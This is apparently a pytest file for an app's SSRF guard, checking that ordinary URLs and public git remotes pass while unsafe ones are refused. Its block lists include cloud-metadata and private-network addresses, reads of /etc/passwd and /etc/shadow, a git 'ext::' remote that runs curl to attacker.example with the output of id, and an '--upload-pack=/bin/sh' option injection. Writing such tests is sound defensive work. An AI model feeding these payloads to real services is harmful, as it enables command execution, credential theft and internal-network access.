"""SSRF guard tests (Direction 021)."""

import pytest

from app.core.net_safety import (
    UnsafeUrlError,
    assert_public_git_remote,
    assert_public_url,
)


@pytest.mark.parametrize(
    "url",
    [
        "http://169.254.169.254/latest/meta-data/",  # cloud metadata
        "http://127.0.0.1:8000/api/health",  # loopback literal
        "http://localhost/admin",  # loopback name
        "http://10.0.0.5/internal",  # RFC1918
        "http://192.168.1.1/",  # RFC1918
        "http://[::1]/",  # IPv6 loopback
        "ftp://example.com/x",  # bad scheme
        "file:///etc/passwd",  # bad scheme
    ],
)
def test_blocks_unsafe_urls(url):
    with pytest.raises(UnsafeUrlError):
        assert_public_url(url)


@pytest.mark.parametrize(
    "url",
    [
        "https://example.com/api/health",
        "https://api.github.com",
        "http://93.184.216.34/",  # public IP literal
    ],
)
def test_allows_public_urls(url):
    # Should not raise (unresolvable hosts are allowed through by design).
    assert_public_url(url)


def test_unresolvable_host_is_allowed_through():
    # No internal service is reachable if DNS fails; keeps tests hermetic.
    assert_public_url("https://nonexistent.invalid.tld.example/x")


# ─── git remotes: validate the HOST, never the scheme ──────────────────────


def test_ssh_remotes_are_a_supported_feature_not_a_threat():
    """ssh remotes DO authenticate here because git inherits the host env
    (~/.ssh keys); the control is host validation, not scheme banning.

    Written down because the previous pass at this bug inferred the opposite —
    that an ``ssh://`` remote could not authenticate and could therefore be
    refused wholesale — and banning the scheme broke a live feature without
    closing anything: ``https://10.0.0.5/x`` reaches the same internal host as
    ``ssh://10.0.0.5/x``.
    """
    assert_public_git_remote("ssh://git@github.com/owner/repo.git")
    assert_public_git_remote("git@github.com:owner/repo.git")


@pytest.mark.parametrize(
    "url",
    [
        "file:///etc/passwd",  # reads the worker's filesystem
        "file://localhost/srv/git/repo.git",
        "ext::sh -c 'curl http://attacker.example/$(id)'",  # git executes it
        "ext::cat /etc/shadow",
        "http://169.254.169.254/",  # cloud metadata
        "https://169.254.169.254/latest/meta-data/",
        "ssh://git@10.0.0.5/x",  # RFC1918 over ssh
        "git@10.0.0.5:x/y.git",  # RFC1918, scp-style
        "https://127.0.0.1/x/y",  # loopback
        "ssh://git@localhost/x/y",  # loopback by name
        "git://192.168.1.1/x",  # RFC1918 over the git protocol
        "https://[::1]/x/y",  # IPv6 loopback
        "/srv/git/repo.git",  # bare local path
        "../../../etc",  # relative local path
        "--upload-pack=/bin/sh",  # would be read as a git option
        "",
    ],
)
def test_blocks_unsafe_git_remotes(url):
    with pytest.raises(UnsafeUrlError):
        assert_public_git_remote(url)


@pytest.mark.parametrize(
    "url",
    [
        "https://github.com/owner/repo",
        "https://github.com/owner/repo.git",
        "http://github.com/owner/repo.git",
        "ssh://git@github.com/owner/repo",
        "ssh://git@github.com:22/owner/repo.git",
        "git@github.com:owner/repo",
        "github.com:owner/repo.git",  # scp-style with no user
        "https://x-access-token:ghp_dummy@github.com/owner/repo.git",
        "https://gitlab.com/group/sub/project.git",
    ],
)
def test_allows_public_git_remotes(url):
    assert_public_git_remote(url)


def test_unresolvable_git_host_is_allowed_through():
    """Same posture as assert_public_url: no internal service is reachable if
    DNS fails, and it keeps the suite hermetic offline."""
    assert_public_git_remote("https://nonexistent.invalid.tld.example/o/r.git")
